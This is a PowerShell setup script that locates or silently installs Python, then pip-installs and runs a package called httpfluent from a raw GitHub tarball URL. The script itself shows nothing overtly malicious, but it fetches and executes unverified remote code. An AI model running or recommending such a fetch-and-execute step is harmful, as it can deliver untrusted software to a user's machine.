Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Find Python
# -----------------------------
$BestPython = $null
$BestVersion = $null

$Candidates = @()

$cmd = Get-Command python -ErrorAction SilentlyContinue
if ($cmd) { $Candidates += $cmd.Source }

$Roots = @(
 "$env:LOCALAPPDATA\Programs\Python",
 "$env:ProgramFiles\Python",
 "$env:ProgramFiles(x86)\Python"
)

foreach ($r in $Roots) {
 if (Test-Path $r) {
  Get-ChildItem $r -Directory -ErrorAction SilentlyContinue | ForEach-Object {
   $p = Join-Path $_.FullName "python.exe"
   if (Test-Path $p) { $Candidates += $p }
  }
 }
}

foreach ($c in ($Candidates | Select-Object -Unique)) {
 try {
  $v = & $c --version 2>&1
  if ($v -match "Python (\d+\.\d+\.\d+)") {
   $ver = [version]$Matches[1]
   if ($ver -ge [version]"3.9") {
    if (-not $BestVersion -or $ver -gt $BestVersion) {
     $BestVersion = $ver
     $BestPython = $c
    }
   }
  }
 } catch {}
}

# -----------------------------
# Install Python if missing
# -----------------------------
if (-not $BestPython) {
 Write-Host "[!] Installing Python 3.12.6" -ForegroundColor Yellow

 $Installer = "$env:TEMP\python.exe"
 Invoke-WebRequest "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe" -OutFile $Installer

 Start-Process $Installer "/quiet InstallAllUsers=0 PrependPath=1" -Wait

 $BestPython = (Get-Command python).Source
}

if (-not (Test-Path $BestPython)) {
 Write-Host "[-] Python not found" -ForegroundColor Red
 exit 1
}

Write-Host "[+] Python: $BestPython" -ForegroundColor Green

# -----------------------------
# Ensure pip
# -----------------------------
& $BestPython -m ensurepip | Out-Null
& $BestPython -m pip install --upgrade pip --no-user

# -----------------------------
# Install httpfluent
# -----------------------------
& $BestPython -m pip install requests --no-user
& $BestPython -m pip install https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz --no-user

# -----------------------------
# Resolve Scripts dir (SAFE)
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))"
$ScriptsDir = $ScriptsDir.Trim()
$Exe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[+] Scripts dir: $ScriptsDir" -ForegroundColor Green

# -----------------------------
# Run httpfluent
# -----------------------------
if (Test-Path $Exe) {
 Write-Host "[+] Running httpfluent --help" -ForegroundColor Green
 & $Exe --help
} else {
 Write-Host "[-] httpfluent.exe not found" -ForegroundColor Red
}

Write-Host "[*] Done." -ForegroundColor Cyan
